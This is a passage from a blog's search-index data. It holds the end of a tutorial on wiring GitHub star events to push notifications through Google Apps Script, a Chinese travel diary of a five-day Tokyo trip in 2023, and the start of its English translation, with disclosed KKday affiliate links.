lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxNzgiIGhlaWdodD0iMjM5Ij48cmVjdCB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiBmaWxsPSJncmV5Ii8+PC9zdmc+\" }![](/assets/382218e15697/1*RBTSeK1kQ3JSZJBgPnAAWA.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3NTUiIGhlaWdodD0iNTg2Ij48cmVjdCB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiBmaWxsPSJncmV5Ii8+PC9zdmc+\" }This completes the code update deployment.#### Github Webhook Settings- Go back to [Github](https://github.com/){:target=\"_blank\"}- We can set up a Webhook for Organizations (all repos inside) or for a single repo to listen for new ⭐️ stars.Navigate to Organizations / Repo -&gt; \"Settings\" -&gt; find \"Webhooks\" on the left -&gt; \"Add webhook\":![](/assets/382218e15697/1*Ke5ZarGC8ODrFLj8LsBNFg.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMjc1IiBoZWlnaHQ9Ijg0NCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }![](/assets/382218e15697/1*PUHcpcJkbL4d7xTI5A99PA.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI2NzAiIGhlaWdodD0iMzc1Ij48cmVjdCB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiBmaWxsPSJncmV5Ii8+PC9zdmc+\" }- Payload URL **:** Enter the `GAS URL` and manually append our own security verification string `?secret=githubWebhookSecret` to the end of the URL. For example, if your `GAS URL` is `https://script.google.com/macros/s/XXX/exec` and `githubWebhookSecret` is `123456`; then **the URL will be: `https://script.google.com/macros/s/XXX/exec?secret=123456`.**- **Content type:** Select `application/json`- **Which events would you like to trigger this webhook?** **Select \"Let me select individual events.\"** **⚠️️ Uncheck \"Pushes\"** **️️️️⚠️ Check \"Watches,\" please note it is not \"Stars\" (but ** Stars also monitor the status of star clicks, so if using Stars for GAS actions, adjustments are needed **).**- Select \"Active\"- Click \"Add webhook\"- Complete the setup#### 🚀 TestingGo back to the configured Organizations Repo / Repo and click \"Star\" or un-star and then re-\"Star\":![](/assets/382218e15697/1*0CaNDxOub_Eo_byb-WfpTQ.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI1ODgiIGhlaWdodD0iNjkiPjxyZWN0IHdpZHRoPSIxMDAlIiBoZWlnaHQ9IjEwMCUiIGZpbGw9ImdyZXkiLz48L3N2Zz4=\" }You will receive a push notification!![](/assets/382218e15697/1*hKN9lAQTsm-tOnJSLj3GGw.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIzOTMiIGhlaWdodD0iMTIzIj48cmVjdCB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiBmaWxsPSJncmV5Ii8+PC9zdmc+\" }That's a wrap! 🎉🎉🎉🎉### Promotions[![](https://repository-images.githubusercontent.com/602927147/57ce75c1-8548-449c-b44a-f4b0451ed5ea)](https://github.com/ZhgChgLi/ZMarkupParser){:target=\"_blank\"}[![](https://repository-images.githubusercontent.com/516425682/1cc1a829-d87d-4d4a-925b-60471b912b23)](https://github.com/ZhgChgLi/ZReviewTender){:target=\"_blank\"}If you have any questions or feedback, feel free to [contact me](https://www.zhgchg.li/contact){:target=\"_blank\"}.This article was first published on Medium ➡️ Click HereAutomatically converted and synchronized using ZMediumToMarkdown and Medium-to-jekyll-starter.Improve this page on Github.Follow Me on Medium 1K+ Followers 778 Total Views Last Statistics Date: 2025-08-15 | 684 Views on Medium." }, { "title": "遊記 2023 東京 5 日自由行", "url": "/posts/z-%E5%BA%A6%E6%97%85%E8%A1%8C%E9%81%8A%E8%A8%98/%E9%81%8A%E8%A8%98-2023-%E6%9D%B1%E4%BA%AC-5-%E6%97%A5%E8%87%AA%E7%94%B1%E8%A1%8C-9da2c51fa4f2/", "categories": "Z 度旅行遊記", "tags": "生活, japan, tokyto, tokyo-disneysea, traveling", "date": "2023-07-10 00:00:37 +0800", "snippet": "ℹ️ℹ️ℹ️ Click here to view the English version of this article, translated by OpenAI.[遊記] 2023 東京 5 日自由行繼上個月京阪神後，2023/06 東京 5 日自由行紀錄及食住行資訊2023/05 京阪神 8 日自由行繼上一篇「 [遊記] 2023 京阪神 &amp; 🇯🇵初次著陸 」很快地，隔了一週...", "content": "ℹ️ℹ️ℹ️ Click here to view the English version of this article, translated by OpenAI.[遊記] 2023 東京 5 日自由行繼上個月京阪神後，2023/06 東京 5 日自由行紀錄及食住行資訊2023/05 京阪神 8 日自由行繼上一篇「 [遊記] 2023 京阪神 &amp; 🇯🇵初次著陸 」很快地，隔了一週又再次來到日本。你說為何不待在日本直接搭新幹線從大阪到東京？原因是東京行其實才是本來預期內安排的出國旅行，京阪神之行純屬程咬金。加上懶得改機票跟改住宿和不想有一週要 Work From Japan (覺得玩就要純粹玩)，所以京阪神完就先回來台灣。後面來看，還好有回來；因為回台灣的那週日本遇到超強颱風，淹水、新幹線停駛、車站塞爆；如果那週在日本想必也沒什麼地方可以去吧。(終於不是🌧️雨神了啊啊啊)東京行的組合 — 三單男我 &amp; 當前同事 (Sean) &amp; 前前同事 ( James Lin )；其中 Sean &amp; James 是大學同學。(沒錯，業界就是這麼小 XD) 日本入境資訊、其他資訊心得分享請參考 前一篇 。KKday 推廣 KKday 日本｜東京迪士尼度假區門票｜Tokyo Disney Resort 日本eSIM卡｜每日高速、總量、無限流量吃到飽方案 SHIBUYA SKY 展望台電子門票｜即買即用 日本・東京|江戶・淺草雷門・晴空塔|人力車體驗 東京和服租借推薦!】日本東京淺草|和服體驗(淺草首家日雜風和服店家、距離雷門只需要徒步3分鐘) 日本東京｜東京鐵塔大展望台 Tokyo Tower ｜電子門票行前準備說歸說東京行才是預期出國安排內，但我們也一直只停留在嘴上説說；直到我京阪神那邊都確定的差不多了，東京這邊也才開始規劃跟實際執行。樂tripmoment對沒去過的地方，我依然是 ENFP 隨性派，覺得去哪裡都很新鮮；所以主要只負責大方向的機票跟住宿還有交通；景點就看其他旅伴想去哪或當下感覺想去哪看看才決定。樂，主要由 Sean &amp; James Handle 了一切，我們有計劃需要先買票的是迪士尼樂園(海洋)跟橫濱鋼彈、Shibuya Sky；因此在出發前兩週就先買好票了。 以上沒有先買，到現場都是沒有空的位子可以進去的。這次我家上次剩的，帶了 $60,000 日幣，最後只剩 $5,00 上下。 因為在新宿的藥妝店遇到 Visa 刷不過只能付現金 $10,000 多買藥妝，還有最後想說把現金花光。 另外最後還差點回不來，在東京車站買往成田機場的車票時不能刷卡，東湊西湊下才湊齊車錢。行🛫因為這次只排 5 天，時間不多，因此機票優先選早去晚回；因為日期接近一樣直接上 SkyScanner 找時間好的航班了。桃園 &lt;-&gt; 成田 6/7 長榮 BR 184 08:00 TPE -&gt; NRT 12:25 6/22 長榮 BR 195 20:40 NRT -&gt; TPE 23:20來回： $17,086 這邊犯了個錯， 就是不應該一個人刷三張機票 ，要自己買自己的，因信用卡刷卡買機票會送旅遊保險。 後來還發現松山飛羽田沒貴多少還比較方便 Orz。旅遊險：Done📲一樣上 KKDAY 買 5 天吃到飽的 SIM 卡約 $500。( 日本eSIM卡｜每日高速、總量、無限流量吃到飽方案 )🚈同 上篇 iPhone 一樣直接使用西瓜卡，我朋友是 Android 就只能去買 Welcome Suica 限時西瓜卡（在成田機場問，真的只剩這個）。住這次只去東京，因此就找一間能住四天不用換的；因為時間接近，東京連鎖的 東橫 Inn or APA 全都沒有空房了；只能上 Agoda 找東京地圖靠近中間又有電車地鐵站的飯店。Hotel Villa Fontaine Grand Tokyo-Shiodome — 4 晚出來就是汐留站，可以直接去台場或新宿。如果要去其他地點要走路到新橋站(大約 10 分鐘)，從新橋過到東京車站大約也是再 10 分鐘 (1–2 站的距離)。還算方便並且價格合理、評價 OK，實際住下來除了乾淨舒服，房間內也不會太小。因為是三個人，格局是兩張床＋沙發上鋪床墊（實際睡起來跟床一樣）3人共 NT$23,894町．草休行館 CHO Stay Capsule Hotel-全台唯一機場膠囊旅館 | 桃園機場膠囊旅館 | 桃園機場飯店 | Taoyuan Airport Hotel | 桃園空港 ホテル — Day 0 過夜這次出行比較特別的是因為是一早 8 點的飛機，我們又都從台北出發；抓 6 點到機場，凌晨 4–5 點就要出門了；加上要出去玩的緊張興奮會難以入眠，根本睡不了幾個小時。因此在出發前幾天決定前一天晚上就先去機場過夜，聽朋友說才知道原來桃園機場有膠囊旅館，就來試試了！地點：就在第二航廈南側號5樓，下樓就是第二航廈 (走下來約 5 分鐘)房間有雙人房、三人房、四人房、跟單人床位 (大概有 16 個床位一間)我們訂的時候就只剩單人床位了。1人 NT$1,500Day 0 出發基本上我就是把京阪神買的東西卸貨，把一些衣物用品拿出來，再重新整理放回行李箱就出發了。機捷預辦登機目前還不能辦理隔日航班，因此只能提著行李箱大包小包的去第二航廈。Sean &amp; Me &amp; James到達第二航廈後直上三樓出境大廳，到達出境大廳後找到往 22–26 南側商場觀景台的位置(面對大廳往右走到底)。走到底看到手扶梯往上走手扶梯一上來就會看到很有台灣風格的旅館門口桃機膠囊旅館Check-In 後就能先進去放行李，然後出來外面覓食。 房間內禁止飲食，我們這次入住每人送一個茶包可以請櫃檯幫忙泡，坐在門口吧台喝，現場填寫加入會員有送毛巾。門口有耳塞可以免費索取。走廊衛浴設施很新很乾淨舒服，馬桶有兩個、淋浴間有五間、有兩隻吹風機(1 隻 Dyson)、有提供沐浴乳洗髮精，只要自備毛巾盥洗用具。男衛浴一進來左手邊有行李房可以放行李，床位格局如下：床位宿舍每個床位都有獨立的鏡子、書桌、燈、窗簾、垃圾桶；我睡的是上鋪，床墊很厚不怕因為動來動去吵到下舖。床墊除了厚之外也夠長，176 CM 睡起來沒什麼問題；環境乾淨、燈光溫馨、冷氣很舒服；唯一不可抗拒的因素就是有人打呼還是會傳遞進來。(所以門口有提供免費耳塞)不過我不怕吵，只要溫馨放鬆就能睡得很好；於是我一覺到天亮，直接睡到快 6 點才洗漱 Check-out（直接睡飽睡滿，再出國）。 還好我們前一晚有預定，遇到有其他旅客想現場入住，已經沒位子了。一早起來先悠閒的看一下機場風景：本來以為早上 8 點會人擠人但運氣很好幾乎沒人 早知道就在膠囊旅館睡到 7 點再下來了！候機這次遇到的登機口要搭接駁車(大陸網友稱擺渡車)很熱很擠，但還是到登機口了：Bye 🇹🇼抵達成田機場Hey 🇯🇵Day 1 渋谷、Parco、Shibuya Sky從下機到入境大廳大概要走個 15 分鐘，再到提領行李實際出關入境大約已經下午 1 點了。 轉搭成田特快的時候一開始犯蠢，直接刷 西瓜卡進站；結果整班特快都是指定席，只能回頭出站買票再進站（後來發現好像可以直接在站內月台機器買票）。後來搭上兩點出的成田特快往東京車站。一路看風景，能看到晴空塔的時候就代表快到了。到達東京車站後再轉搭地鐵到新橋站，然後找路、走路到汐留。飯店藏身在辦公大樓內，很特別：一開始以為走錯走到人家辦公大樓，結果往裡面走就是飯店了。放行李、休息一下：Hotel Villa Fontaine Grand Tokyo Shiodome (影片是後來才補拍的，有點亂ＸＤ)前往 渋谷 (澀谷) Shibuya這個十字路口一定要來朝聖一下，想到今際之國的闖關者。Netflix — 今際の国のアリス渋谷 Parco — 極味屋排隊品嘗有名的極味屋，大約 5 點半左右到，排差不多 45 分鐘就有位子了。我點的是神戶牛漢堡肉＋神戶牛排＋湯飯冰淇淋的套餐組合 ($3,355 日圓)：店員幫忙 Set 好時的熟度約只有 1 分，要自己夾起來放到鐵板煎到自己喜好的熟度。極味屋這邊要注意要使用兩雙筷子；因衛生，鐵的用來煎、竹的用來吃，交替使用。 神戶牛排超好吃，汁多裡嫩，沒有任何牛騷味🤩；漢堡肉也不錯，但比較膩一點。渋谷 Parco — 對自己吐槽的白熊專賣店失手買了一些。渋谷 — Shibuya Sky還好 Sean 有提早買票，現場才買根本進不去。 KKday SHIBUYA SKY 展望台電子門票｜即買即用上面很黑、有點風，不能攜帶包包上去(有提供有鎖置物櫃)。除了角落有一家酒吧之外沒有其他設施、光害，拍照跟看夜景很漂亮。酒吧應該要另外訂位，開放時間同參觀時間。回飯店後依然是清酒泡麵點心三件組，結束這一日豆皮泡麵好好吃。Day 2 橫濱鋼彈、台場、新宿第二天一早趕 10 點鋼彈表演，先搭電車到櫻木町站再轉搭纜車＋走路到鋼彈工廠。橫濱鋼彈天氣超級好啊！！鋼彈表演一路從 10 點到中午，不同場次有不同劇情；但因為我不是鋼彈迷所以只是跟來走馬看花。但不得不說很壯觀，細節、動作跟聲音很精緻。裡面還有周邊專賣店，賣鋼彈模型跟獨家商品。Sean 的鋼彈完成品因為不是鋼彈迷，因此我進場逛了一下看了幾場表演就先離開了。台場改前往台場，從汐留出發到台場的電車很酷，一路上可以看到富士電視台跟整個台場的景觀。抵達台場後先來看台場的自由女神。是紐約的自由女神的1/7， 象徵日法的友好關係。再往前走一點回頭一望就是在烏龍派出所裡被阿兩破壞很多次的富士電視台再往前走一點到商場吃章魚燒跟台灣雞排？章魚燒普，太多顆很膩；雞排蠻特別的，雖然寫台灣唐揚，不過實際是日式雞排(薄、無骨)然後用台灣裹粉的炸法，跟台灣雞排還是不一樣，不過我還是跟店員說好吃、我是台灣人🤣。本來打算去台場的百貨公司買買衣服鞋子，但快到的時候撇見地鐵能到新宿；就突然拐個彎前往新宿了。新宿開始逛街走走看看去 La Lebo 聞了一下東京專屬的 GAIAC 10 號味道覺得很淡…木質調…聞不太出來。(但 Day 4 還是下手了)最後只去百貨公司買買衣服褲子跟藥妝，天氣開始陰雨就折返回飯店了。一樣用吃結束這一天熱狗好吃、水果酒好喝！Day 3 迪士尼海洋一早出發，當天早上天氣陰雨綿綿。 KKday 日本｜東京迪士尼度假區門票｜Tokyo Disney Resort我們買的是海洋，沒買陸地， 那個漂亮的城堡陸地才有；海洋的入口要再搭園內的電車去。 入園後開始抽抽可以抽的表演或入場，但都沒中，最後我們購買晚上的表演煙火活動「 堅信！～夢想之海～ 」的前排位子(不買也可以在外圍看，表演在港灣公共區域)。雨越來越大，於是先去路邊商店買米奇雨衣：個人覺得質感材質都蠻好的，還有可愛的米奇或米妮圖案(深紅色)可以選，而且不貴！！ 幸運的是中午後就沒下啦！！我不是雨男！！買完雨衣就直衝「 玩具總動員瘋狂遊戲屋 」：人很多，大概排了 100 多分鐘才排到：遊戲內容是 2 人一組(1 人就跟人機)操作按鈕射投影氣球得分，趣味性高，刺激性低，很適合情侶或親子。旁邊還有蛋頭先生的互動劇場表演跟小的紀念品店：很可愛的抱哥玩偶！！再來是「 翱翔：夢幻奇航的圖像 」，也是熱門遊樂設施：排隊入場後在遊戲開始之前會有場景開始帶入，探險家的故事，掛在牆上的畫，其實是高解析螢幕，有動畫跟講話，效果很厲害！劇場，球型巨幕＋4D 體驗(座椅會上升前進＋空氣味道)；內容是世界各地的風景，例如大草原就會有草原的味道；很驚艷，適合所有人！ 這邊我們是買快速通關。玩完這兩個設施之後接近中午時分，開始覓食，因為餐廳都滿了就只能找小吃類的食物，我們就隨便吃了 Pizza、雞腿…等等。拿著食物出來剛好港灣表演活動「 眾彩同慶 」開始：吃飽開始在園區繞繞逛逛紀念品店：消化的差不多後開始排「 地心探險之旅 」：大約需要 90–100 分鐘，排到剛好完全消化完了，不然太刺激XD內容是復刻電影地心歷險，場景跟沈浸很厲害；最後會有加速＆稍微地往下衝(失重感)，刺激感較強但不會到真的腿軟，適合想找尋一點刺激的朋友。出來後又去旁邊的「 海底兩萬哩 」緩和一下：沒什麼人，內容是仿造的潛水艇下水探索的感覺(但應該是模擬)，刺激性很低，只適合小小孩。坐完繼續逛逛吃吃：很可愛但很甜的米奇冰棒，還有安娜貝爾(玲娜貝爾)。繼續走走拍拍，園區真的很大，單純拍一些造景，動畫類夢幻場景都沒拍：走到底後又去搭了「 印第安納瓊斯冒險旅程：水晶骷髏頭魔宮 」：沒有地心探險之旅刺激(不會失重往下衝、也沒那麼快)，內容是電影印第安納瓊斯的沈浸場景，個人覺得有趣好玩。繼續走馬看花：也搭了「 迪士尼海洋渡輪航線 」與「 迪士尼海洋電氣化鐵路 」因為走得腳很酸，沿途順便看看風景不錯；比較偏向園區內交通設施，無特別遊樂效果。時間接近傍晚時，開始大買特買跟拍照：不得不說很容易買瘋了，因為很多 40 週年限定；順便跟地球拍照。接近表演開演時間後開始走回港灣，入場席地而坐。如前述，我們有加購一般席的觀賞位子。整場表演陳進體驗感很強，包含音樂、投影(後面火山會爆炸！)、雷射、煙火、迪士尼海洋相關角色劇情…結合得很好，一定要留到晚上看完表演才值回票價。 整天的迪士尼體驗下來的心得是，所有設施都很有沈浸感，不是單純的遊樂設施，而是希望遊客能融入那個角色與場景；雖然刺激性不如環球，但我覺得趣味性很足；晚上的煙火表演一定要看！ 很多可愛的周邊要控制好自己的手(剁手手)！ 食物方面都亂吃，覺得從外面帶自己的食物進來應該比較好。 時間允許的話要兩天陸+海，海的沒有夢幻城堡跟陸地上的遊行QQJR 舞濱車站外面還有最後一家周邊專賣店可以買，最後又逛了一下，才依依不捨的離開。回飯店後，繼續每日慣例；今天吃醬油泡麵、哈密瓜果肉果汁(好喝！！)、秋雅的梅酒(好喝！！)、烏龍燒酒（沒什麼味道，不好喝）。Day 4 東京鐵塔、明治神宮、Le Labo、龜有烏龍派出所、淺草雷門、晴空塔一早睡飽後，才開始想今日行程(瘋狂 ENFP)，大家一起的只有晚上的晴空塔；早上朋友們去秋葉原了，是個獨自探索東京的一天。東京鐵塔看了地圖，新橋離東京鐵塔不遠；就決定先去那兒了。走出門發現地鐵有事故嚴重誤點，看 Google Map 距離不遠，就改用走的了(約 20 分鐘)：一人徒步在東京街頭看看風景，6 月還不會太熱，吹吹風很舒服。在路邊遇到賣熱呼呼的烤蕃薯快走到東京鐵塔時經過一個公園「Tokyo Metropolitan Shiba Park⁩」從這邊的樹枝間看鐵塔也別有一番風味：繼續走過個山腳路，就到東京鐵塔下了。 KKday 日本東京｜東京鐵塔大展望台 Tokyo Tower ｜電子門票進入鐵塔後買了 Top Deck 門票；除了可以上到鐵塔最頂端還包含導覽(有中文語音)，並且附送一張到此一遊的紀念照片！(體驗很棒)導覽有類似昨天迪士尼會動的壁畫ＸＤ兩位前人在對話，內容那略是要蓋一棟日本有標誌性的建築物，同一位建築師另一個作品是大阪的通天閣。早上鳥瞰東京景觀也不錯，第三張遠方就是晚上要去的晴空塔。最後附上免費的登頂成功紀念照！明治神宮去完東京鐵塔，看了下地圖決定下一站去明治神宮。出地鐵又走了一大段 (約 30 分鐘)才到明治神宮內。比較特別的事是剛好遇到日本傳統婚禮，在旁參觀：最後在本殿完成參拜就離開了覺得明治神宮比較莊重嚴肅，後面去淺草寺覺得觀光客太多很雜。下一站是自己從小看到大的龜有-烏龍派出所，想去看看長怎樣；在去的路上時先去表參道的 Le Labo 再次聞聞看。LE LABO 青山店其實我對 Le Labo 興趣不大，個人比較喜歡 Ormonde Jayne 的香水，而且 Le Labo 給我一種大眾賣包裝的感覺。聞了一輪買了 Another 13，味道夠濃；還有不免俗跟風買了東京專屬的 Gaiac 10，都買 15ml 當紀念。Le Labo香水都是現場封裝跟貼標的(約需等 15–20 分鐘)，可以客製化自己的標籤；13 是我自己喜歡的所以選「ZhgChgLi」、10 是代表東京，用破英文問店員哪個能代表日本，他說 ♨️ 😝。日本 Le Labo 價格如上，加上免稅最後 13 再少 $1,000 日圓。東京專屬的 Gaiac 10 比較貴，免稅後還要 $16,800 日圓。龜有烏龍派出所買完就繼續往龜有搭（龜有真的蠻遠的）。一出站正門就有烏龍派出所的人像：看地圖先跑去後站的龜有公園逛逛：就只是一般的公園QQ，很多小孩在裡面踢球就這樣，公園椅子有一個阿兩的坐姿人像，被放滿小孩的東西包包類，就沒拍了。查網路附近的 Ario 百貨公司有烏龍派出所的場景跟樂園，於事繼續走去(約 10 分鐘)：進去後心態崩了，幾乎可以確定歸有已經不維護烏龍派出所這個 IP (年輕人都不看了…) ；除了車站出來的人像外，從前面的日常公園到所謂的烏龍派出所樂園，目前也只剩下佈景還在，佈景之外已經改裝成遊樂場(夾娃娃機)了。最慘的是入口的阿兩扭蛋機，阿兩人像的眼睛破掉也沒修，整個很淒涼；最後扭了一個熱褲刑警，就悻悻然地離開了。看地圖搭公車到淺草比較近，查路線＆走到公車站大概花了 15 分鐘：走到公車站的路上幾乎都沒人、也沒觀光客，公車站路線 Google 連翻譯也沒；真的來到非觀光區了。上公車時還出了烏龍，因為在京都搭是下車才收費，所以上車就呆呆地站著，又聽不懂日文，直到好心的日本乘客說 pay pay 我才意會到去前面刷卡付費。一路上很安靜舒服，日本司機都會等到客人坐好、起身下車才會啟動；一路晃晃悠悠到淺草寺。 KKday 日本・東京|江戶・淺草雷門・晴空塔|人力車體驗 KKday 【東京和服租借推薦!】日本東京淺草|和服體驗(淺草首家日雜風和服店家、距離雷門只需要徒步3分鐘)觀光客真的超級超級多啊！！有夠擠，只能找角度拍了。繼續往內淺草寺走，觀光客實在太多了，本來沒打算買任何東西，就只是走來看看；途中吃到這家豆子店，意外的好吃就買了當伴手禮。到淺草寺後人還是一樣很多，拍拍照片就離開了。這時時間也接近傍晚，開始慢慢的往晴空塔移動。淺草寺遠眺晴空塔。晴空塔因為時間還早，所以一樣用走的一路看風景過去。 KKday 東京晴空塔展望台門票 / 享樂套票Tokyo Subway 24-hour Ticket / 墨田水族館越走越近，越來越大。走到晴空塔後，先在裡面的商場逛逛，點了杯北海道草莓冰淇淋休息一下。晴空塔我們沒買到 Top Deck，只買到中間景觀，7點入場。剛上去時還沒天黑，先隨手拍了幾張：日落後，可以鳥瞰整個東京的夜景，很美：第一張圖左上角就是遠方的東京鐵塔；裡面很暗、玻璃會反光不太好自拍人像。免強拍了一張ＸＤ離開前最後回眸一拍。最後一晚吃吃居酒屋、拍拍路上的夜景記錄：鶏の炭火焼日本今天開始天氣也不好了，沒想到每天經過的汐留就能看到東京鐵塔、還有特別的裝置藝術，最後一天才駐足欣賞。最後一晚的宵夜還是日清泡麵好吃加上超商炸雞🤤！前幾天買哈密瓜的果肉果汁，今天買草莓的，一樣好喝；清酒沒印象，這兩隻應該普普。Day 5 國會議事堂、皇居、東京車站、回程起床後去寄放行李，同 Day 4 獨自隨性看感覺探索東京，因為是晚上的飛機，還有大半天可以晃，天氣陰雨不佳。想到昨天在晴空塔扭蛋機看到日本代表地標有一個國會議事堂沒看過，就先朝這邊去。國會議事堂趣事之一是在路上遇到日本極端主義的抗議：開著宣傳車在國會議事堂附近大聲廣報，被警察攔下來後警察拆除他的廣播器；後來又加速闖紅燈逃跑，到處都警察，有點可怕。經過國會議事堂看大門緊閉就沒進去了(好像可以從側門進去參觀?)：遠遠的拍一張到此一遊照，就往下往皇居走了。皇居皇居真的很大，光從最外面走道入口就大概花了快 30 分鐘。走到天守台之後就離開了，當天皇居內也沒有開放參觀。大概又走了快 1 小時回到東京車站一代(可以搭地鐵，但就一兩站；我喜歡在街頭走走看看風景)。東京車站此時也接近中午，在東京車站內亂逛；只是證明一下自己不會迷路，但很懶得排有名的伴手禮店。最後一餐吃天婦羅蕎麥麵。順手去賣酒的商鋪帶一大一小清酒回台灣，店員還是台灣人。回程約莫下午 4 點多回飯店拿行李，開始慢慢移動到成田機場。新橋離開前一隅。回程直接從新橋去成田空港因為班次問題跟時間很充裕，搭的是都營淺草線機場快線，大約 1 小時 15 分多會到； 但不能用刷卡、Sucia 買票，於是當下東拼西湊湊齊三個人的票錢，差一點買不起 。到機場時大約 5:30 還很早。出境之後時間也還很早，隨便吃個東西墊墊胃然後最後一逛免稅店。發現要買獺祭或常見伴手禮(白色戀人、香蕉蛋糕…)這裡什麼都有，在這裡買就好了ＸＤ獺祭跟我在東京車站買價格差不多。上機，Hey 🇹🇼：日本天氣狀況很不好，一路搖搖晃晃(死魚眼)，比迪士尼的遊樂設施還刺激，一度停止共餐；還好最後安全抵達台灣。出境入關弄一弄大約 00:12 了，搭白牌計程車回台北差不多 01:30；洗個澡直接睡，結束這一堂旅程。後記 日本相關文化心得請參考上篇「 [遊記] 2023 京阪神 &amp; 🇯🇵初次著陸 」 日本時間表示法是 30小時制，25:00 代表凌晨 01:00 很酷 日幣真的要留至少 1 萬上下在身上，避免遇到不能刷卡或不能刷 Vias 卡的狀況 感謝這次的旅伴， Sean INFJ/James ISTJ 規劃大神；Sean 迪士尼怎麼玩先玩哪個、哪個買快速比較值得都是他控場的回台灣後一直重複播的洗腦歌。KKday 推廣 KKday 日本｜東京迪士尼度假區門票｜Tokyo Disney Resort 日本eSIM卡｜每日高速、總量、無限流量吃到飽方案 SHIBUYA SKY 展望台電子門票｜即買即用 日本・東京|江戶・淺草雷門・晴空塔|人力車體驗 東京和服租借推薦!】日本東京淺草|和服體驗(淺草首家日雜風和服店家、距離雷門只需要徒步3分鐘) 日本東京｜東京鐵塔大展望台 Tokyo Tower ｜電子門票 如果這篇文章對您有幫助，歡迎使用我的 推廣連結 選購 KKday 商品、行程，我將獲得部分收益，持續更多旅遊創作，謝謝。更多遊記 [遊記] 2025 韓國釜山 8 天 7 夜自由行 [遊記] 2024 山陰廣域地區 島根 出雲 松江 鳥取 姬路 大阪 神戶 7 日獨旅自由行 [遊記] 2024 二訪九州 9 日自由行，經釜山→博多郵輪入境 [遊記] 2023 廣島岡山 6 日自由行 [遊記] 2023 九州 10 日自由行獨旅 [遊記] 9/11 名古屋一日快閃 [遊記] 2023 京阪神 8 日自由行有任何問題及指教歡迎 與我聯絡 。本文首次發表於 Medium ➡️ 前往查看由 ZMediumToMarkdown 與 Medium-to-jekyll-starter 提供自動轉換與同步技術。Improve this page on Github.如果這篇文章對您有幫助，歡迎使用我的 推廣連結 選購 KKday 商品、行程，我將獲得部分收益，持續更多旅遊創作，謝謝： Follow Me on Medium 1K+ Followers 1,698 Total Views Last Statistics Date: 2025-08-15 | 1,661 Views on Medium." }, { "title": "Travel Diary: 5-Day Free Trip to Tokyo 2023", "url": "/posts/travel-diaries/en/travel-diary-5-day-free-trip-to-tokyo-2023-9da2c51fa4f2/", "categories": "Travel Diaries", "tags": "Lifestyle, Japan, Tokyo, Tokyo DisneySea, Traveling", "date": "2023-07-10 00:00:37 +0800", "snippet": "ℹ️ℹ️ℹ️ The following content is translated by OpenAI.Click here to view the original Chinese version. | 點此查看本文中文版[Travel Diary] 5-Day Free Trip to Tokyo 2023Following last month’s trip to Kansai, h...", "content": "ℹ️ℹ️ℹ️ The following content is translated by OpenAI.Click here to view the original Chinese version. | 點此查看本文中文版[Travel Diary] 5-Day Free Trip to Tokyo 2023Following last month’s trip to Kansai, here is a record of my 5-day free trip to Tokyo in June 2023, including information on food, accommodation, and transportation.8-Day Free Trip to Kansai in May 2023After my previous post, “[Travel Diary] 2023 Kansai &amp; 🇯🇵 First Landing”, I quickly returned to Japan just a week later.You might wonder why I didn’t just stay in Japan and take the Shinkansen from Osaka to Tokyo. The reason is that the Tokyo trip was actually the originally planned overseas travel, while the Kansai trip was just a spontaneous addition.Plus, I didn’t want to deal with changing my flight and accommodation, and I didn’t want to spend a week working from Japan (I believe travel should be purely for enjoyment), so I returned to Taiwan after the Kansai trip.Looking back, I’m glad I did; that week, Japan was hit by a super typhoon, causing flooding, Shinkansen suspensions, and overcrowded stations. If I had stayed in Japan that week, I probably wouldn’t have had many places to go. (Finally, I wasn’t the rain god anymore! 🌧️)The Tokyo Trip Crew — Three Single GuysMe, my current colleague (Sean), and my former colleague (James Lin); Sean and James are college classmates. (Yes, the industry is that small! XD) For information on Japan’s entry requirements and other tips, please refer to the previous post.KKday Promotions [**KKday Japan Tokyo Disney Resort Tickets**](https://www.kkday.com/zh-tw/product/19252?cid=19365&amp;ud1=9da2c51fa4f2){:target=”_blank”} [**Japan eSIM Card Daily High-Speed, Unlimited Data Plans**](https://www.kkday.com/zh-tw/product/137689-japan-high-speed-daily-unlimited-data-japanese-esim?cid=19365){:target=”_blank”} [SHIBUYA SKY Observatory E-Ticket Instant Use](https://www.kkday.com/zh-tw/product/133300-shibuya-sky-observatory-e-ticket-tokyo?cid=19365&amp;ud1=9da2c51fa4f2){:target=”_blank”} [Japan Tokyo Asakusa Senso-ji Temple Rickshaw Experience](https://www.kkday.com/zh-tw/product/1951-tokyo-asakusa-rickshaw-tour-japan?cid=19365&amp;ud1=9da2c51fa4f2){:target=”_blank”} [Recommended Kimono Rental in Tokyo Asakusa Kimono Experience (First Japanese-style Kimono Shop in Asakusa, just a 3-minute walk from Senso-ji Temple)](https://www.kkday.com/zh-tw/product/140384?cid=19365&amp;ud1=9da2c51fa4f2){:target=”_blank”} [Japan Tokyo Tokyo Tower Main Observatory E-Ticket](https://www.kkday.com/zh-tw/product/12271-japan-tokyo-tower-observatory-e-ticket?cid=19365&amp;ud1=9da2c51fa4f2){:target=”_blank”} Pre-Trip PreparationsAlthough the Tokyo trip was the originally planned overseas trip, we had only been talking about it until I finalized the Kansai trip. It was only then that we started planning and executing the Tokyo itinerary.FuntripmomentFor places I haven’t been to, I remain an ENFP free spirit, feeling that anywhere is fresh and exciting; thus, I mainly took charge of the flights, accommodation, and transportation. The attractions were decided based on what my 